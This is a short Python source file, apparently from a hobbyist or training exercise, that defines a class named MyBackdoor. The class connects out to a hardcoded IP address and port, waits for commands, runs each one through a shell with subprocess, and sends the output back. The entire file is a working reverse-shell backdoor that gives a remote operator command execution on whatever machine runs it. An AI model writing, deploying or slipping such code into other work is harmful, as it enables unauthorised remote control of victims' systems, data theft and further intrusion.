import socket
import subprocess
class MyBackdoor:
    def __init__(self,ip,port):
        # AF_INET = IPv4 || SOCK_STREAM = TCP
        self.my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.my_connection.connect((ip,port))

    def command_execution(self,command):
        return subprocess.check_output(command, shell=True)

    def start_backdoor(self):
        #1024 ayrılan byte 
        while True:
            command = self.my_connection.recv(1024)
            command_output = self.command_execution(command.decode('utf-8'))
            self.my_connection.send(command_output)
        
        my_connection.close()


my_backdoor_object = MyBackdoor("192.168.214.177",8080)
my_backdoor_object.start_backdoor()



